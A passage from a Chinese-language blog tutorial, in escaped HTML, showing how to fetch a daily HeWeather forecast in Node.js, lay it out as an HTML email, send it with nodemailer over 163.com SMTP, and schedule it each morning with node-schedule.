class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"HeWeather6\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"basic\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"cid\"</span>: <span class=\"string\">\"CN101020900\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"location\"</span>: <span class=\"string\">\"松江\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"parent_city\"</span>: <span class=\"string\">\"上海\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"admin_area\"</span>: <span class=\"string\">\"上海\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cnty\"</span>: <span class=\"string\">\"中国\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"lat\"</span>: <span class=\"string\">\"31.03046989\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"lon\"</span>: <span class=\"string\">\"121.22354126\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"tz\"</span>: <span class=\"string\">\"+8.00\"</span></span><br><span class=\"line\">            &#125;, </span><br><span class=\"line\">            <span class=\"attr\">\"status\"</span>: <span class=\"string\">\"ok\"</span>, </span><br><span class=\"line\">            <span class=\"attr\">\"now\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"cloud\"</span>: <span class=\"string\">\"0\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cond_code\"</span>: <span class=\"string\">\"101\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cond_txt\"</span>: <span class=\"string\">\"多云\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"fl\"</span>: <span class=\"string\">\"38\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"hum\"</span>: <span class=\"string\">\"56\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"pcpn\"</span>: <span class=\"string\">\"0.0\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"pres\"</span>: <span class=\"string\">\"1003\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"tmp\"</span>: <span class=\"string\">\"34\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"vis\"</span>: <span class=\"string\">\"10\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_deg\"</span>: <span class=\"string\">\"123\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_dir\"</span>: <span class=\"string\">\"东南风\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_sc\"</span>: <span class=\"string\">\"2\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_spd\"</span>: <span class=\"string\">\"6\"</span></span><br><span class=\"line\">            &#125;, </span><br><span class=\"line\">            <span class=\"attr\">\"daily_forecast\"</span>: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"cond_code_d\"</span>: <span class=\"string\">\"100\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_code_n\"</span>: <span class=\"string\">\"101\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_txt_d\"</span>: <span class=\"string\">\"晴\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_txt_n\"</span>: <span class=\"string\">\"多云\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"date\"</span>: <span class=\"string\">\"2018-05-16\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"hum\"</span>: <span class=\"string\">\"74\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"mr\"</span>: <span class=\"string\">\"05:40\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"ms\"</span>: <span class=\"string\">\"19:34\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pcpn\"</span>: <span class=\"string\">\"0.0\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pop\"</span>: <span class=\"string\">\"0\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pres\"</span>: <span class=\"string\">\"1005\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"sr\"</span>: <span class=\"string\">\"04:59\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"ss\"</span>: <span class=\"string\">\"18:44\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"tmp_max\"</span>: <span class=\"string\">\"36\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"tmp_min\"</span>: <span class=\"string\">\"25\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"uv_index\"</span>: <span class=\"string\">\"10\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"vis\"</span>: <span class=\"string\">\"13\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_deg\"</span>: <span class=\"string\">\"181\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_dir\"</span>: <span class=\"string\">\"南风\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_sc\"</span>: <span class=\"string\">\"4-5\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_spd\"</span>: <span class=\"string\">\"25\"</span></span><br><span class=\"line\">                &#125;, </span><br><span class=\"line\">                </span><br><span class=\"line\">            ], </span><br><span class=\"line\">            ......</span><br></pre></td></tr></table></figure>\n<p>当然根据和风天气的文档，已知这是一个json文件，直接使用json parser对 <code>body</code> 处理即可。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=<span class=\"built_in\">JSON</span>.parse(body);</span><br><span class=\"line\">data=data.HeWeather6[<span class=\"number\">0</span>];</span><br></pre></td></tr></table></figure>\n<p>json中包含的信息比较多，可以筛选一些重要的信息来使用。比如 日出时间: <code>daliy_forecast.sr</code>，日落时间: <code>daliy_forecast.ss</code>，最高温度: <code>daliy_forecast.tmp_max</code>，最低温度: <code>daliy_forecast.tmp_min</code>，降水概率: <code>daliy_forecast.pop</code> 等。</p>\n<ol start=\"2\">\n<li><strong>邮件编排</strong></li>\n</ol>\n<p>获得了天气数据后，就可以发送邮件了，但是如何编辑排列得到的天气数据也是一个需要考虑的问题，发一堆杂乱无章的数据，视觉观感不好。当然邮件本身支持html样式，可以编写一个简单的html样式来排列邮件内容。</p>\n<p>最终进行邮件发送时，只需要将这一样式表拼接为字符串即可。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>给主席的天气预报<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">style</span>=<span class=\"string\">\"margin:20px auto 10px auto\"</span>&gt;</span> data.daily_forecast[0].date   data.basic.location 区<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>日出时间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].sr <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>日落时间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].ss+ <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>白天: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].cond_txt_d <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>晚间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].cond_txt_n <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>最高温度: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].tmp_max<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>℃<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>最低温度: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].tmp_min<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>℃<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>紫外线强度指数: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].uv_index<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>降水概率: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>data.daily_forecast[0].pop %<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>风力: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].wind_sc <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>穿衣建议: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.lifestyle[1].txt <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">small</span>&gt;</span>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险<span class=\"tag\">&lt;/<span class=\"name\">small</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><strong>邮件发送</strong></li>\n</ol>\n<p>发送邮件使用 <code>nodemailer</code> 模块。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> nodemailer=<span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"comment\">// 建立SMTP连接</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> smtpTransport = nodemailer.createTransport(&#123;</span><br><span class=\"line\">  host: <span class=\"string\">\"smtp.163.com\"</span>, <span class=\"comment\">// smtp主机</span></span><br><span class=\"line\">  secureConnection: <span class=\"literal\">true</span>, <span class=\"comment\">// 使用SSL</span></span><br><span class=\"line\">  port: <span class=\"number\">465</span>, <span class=\"comment\">// SMTP 端口</span></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    user: <span class=\"string\">\"邮箱前缀@163.com\"</span>, <span class=\"comment\">// 账号</span></span><br><span class=\"line\">    pass: <span class=\"string\">\"******\"</span> <span class=\"comment\">// 授权码</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">// 设置邮件内容</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mailOptions = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">from</span>: <span class=\"string\">\"名字 &lt;邮箱前缀@163.com&gt;\"</span>, <span class=\"comment\">// 发件地址</span></span><br><span class=\"line\">  to: <span class=\"string\">\"XXXXXXX@example.com\"</span>, <span class=\"comment\">// 收件地址</span></span><br><span class=\"line\">  subject: <span class=\"string\">\"Hello\"</span>, <span class=\"comment\">// 标题</span></span><br><span class=\"line\">  html: <span class=\"string\">\"&lt;b&gt;邮件由nodemailer发送&lt;/b&gt;\"</span> <span class=\"comment\">// html实例，替换为第2步的天气内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">// 发送邮件</span></span><br><span class=\"line\">smtpTransport.sendMail(mailOptions, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">error, response</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(error)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Message sent: \"</span> + response.message);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  smtpTransport.close(); <span class=\"comment\">// 关闭连接</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li><strong>定时</strong></li>\n</ol>\n<p>Unix 与 Linux本身提供了定时启动指令 <code>crontab</code>，当然 node.js 也有自己的定时器，而且使用起来更加方便。</p>\n<p>使用模块 <code>node-schedule</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> schedule=<span class=\"built_in\">require</span>(<span class=\"string\">'node-schedule'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> rule = <span class=\"keyword\">new</span> schedule.RecurrenceRule();</span><br><span class=\"line\">rule.hour = <span class=\"number\">6</span>; rule.minute = <span class=\"number\">30</span>; rule.second = <span class=\"number\">0</span>; <span class=\"comment\">// 定时 06:30:00</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> run = schedule.scheduleJob(rule, YOUR_FUNC); <span class=\"comment\">// YOUR_FUNC 为想要执行的函数</span></span><br></pre></td></tr></table></figure>\n<p>至此所有模块已经基本完成，之后将天气查询，与邮件发送功能封装在一个函数中，传入 <code>schudle.scheduleJob</code> 即可。</p>\n<h2 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> request = <span class=\"built_in\">require</span>(<span class=\"string\">'request'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> nodemailer = <span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> schedule = <span class=\"built_in\">require</span>(<span class=\"string\">'node-schedule'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> rule = <span class=\"keyword\">new</span> schedule.RecurrenceRule();</span><br><span class=\"line\">rule.hour = <span class=\"number\">6</span>; rule.minute = <span class=\"number\">30</span>; rule.second = <span class=\"number\">0</span>; <span class=\"comment\">// 设置定时发送的时间</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> data= <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> j = schedule.scheduleJob(rule, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'发送天气预报...'</span>);</span><br><span class=\"line\">  \tsendWeather();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendWeather</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> url= <span class=\"string\">'https://free-api.heweather.com/s6/weather/forecast?location=城市代码&amp;key=自己的key'</span>; <span class=\"comment\">// 城市代码: 从和风天气文档获得，key: 注册和风天气得到</span></span><br><span class=\"line\">\trequest(url,(error,response,body)=&gt;&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(error)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tdata=<span class=\"built_in\">JSON</span>.parse(body);</span><br><span class=\"line\">\t\tdata=data.HeWeather6[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> transporter=nodemailer.createTransport(&#123;</span><br><span class=\"line\">\t\thost: <span class=\"string\">\"smtp.163.com\"</span>, <span class=\"comment\">// 163邮箱的smtp服务器地址</span></span><br><span class=\"line\">\t\tport: <span class=\"number\">465</span>,</span><br><span class=\"line\">\t\tsecureConnection: <span class=\"literal\">true</span>,</span><br><span class=\"line\">\t\tauth: &#123;</span><br><span class=\"line\">\t\t\tuser:<span class=\"string\">'邮箱前缀@163.com'</span>, <span class=\"comment\">// 邮箱地址</span></span><br><span class=\"line\">\t\t\tpass:<span class=\"string\">'*******'</span> <span class=\"comment\">// smtp授权码，不是邮箱的登录密码</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> mailOptions=&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">from</span>: <span class=\"string\">\"预报君 &lt;邮箱前缀@163.com&gt;\"</span>, <span class=\"comment\">// 与发件地址一致，否则报错</span></span><br><span class=\"line\">\t\t\tto: <span class=\"string\">\"to someone @foxmail.com\"</span>, <span class=\"comment\">// 要发送的邮箱地址</span></span><br><span class=\"line\">\t\t\tsubject: data.daily_forecast[<span class=\"number\">0</span>].date + <span class=\"string\">'の天気'</span>,</span><br><span class=\"line\">\t\t\ttext:<span class=\"string\">'城市 :'</span>+data.basic.location+<span class=\"string\">'时间：'</span>+ data.daily_forecast[<span class=\"number\">0</span>].date,</span><br><span class=\"line\">\t\t\thtml: <span class=\"string\">'&lt;div&gt;&lt;div&gt;&lt;h1&gt;给主席的天气预报&lt;/h1&gt;&lt;/div&gt;&lt;div&gt;&lt;h3 style=\"margin:20px auto 10px auto\"&gt;'</span> + data.daily_forecast[<span class=\"number\">0</span>].date + <span class=\"string\">' '</span> + data.basic.location + <span class=\"string\">'区&lt;/h3&gt;&lt;div&gt;&lt;p&gt;&lt;span&gt;日出时间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].sr+<span class=\"string\">'&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;日落时间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].ss+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;白天: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].cond_txt_d+<span class=\"string\">'&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;晚间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].cond_txt_n+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;最高温度: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].tmp_max+<span class=\"string\">'&lt;/b&gt;℃&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;最低温度: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].tmp_min+<span class=\"string\">'&lt;/b&gt;℃&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;紫外线强度指数: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].uv_index+<span class=\"string\">'&lt;/b&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;降水概率: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].pop+<span class=\"string\">' %&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;风力: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].wind_sc+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;穿衣建议: &lt;/span&gt;&lt;span&gt;'</span> + data.lifestyle[<span class=\"number\">1</span>].txt + <span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;small&gt;注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险&lt;/small&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span></span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\t\ttransporter.sendMail(mailOptions,(err,info)=&gt;&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Message %s sent %s'</span>,info.messageId,info.response);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\ttransporter.close();</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最终效果\"><a href=\"#最终效果\" class=\"headerlink\" title=\"最终效果\"></a>最终效果</h2><p><img src=\"/images/in-post/post-blog-WeatherEmail.jpg\" alt=\"img\"></p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>只需要不到50行就可以自动发送天气邮件了，你是不是也想给她/他每天发一条天气提醒呢？不妨试一试。<a 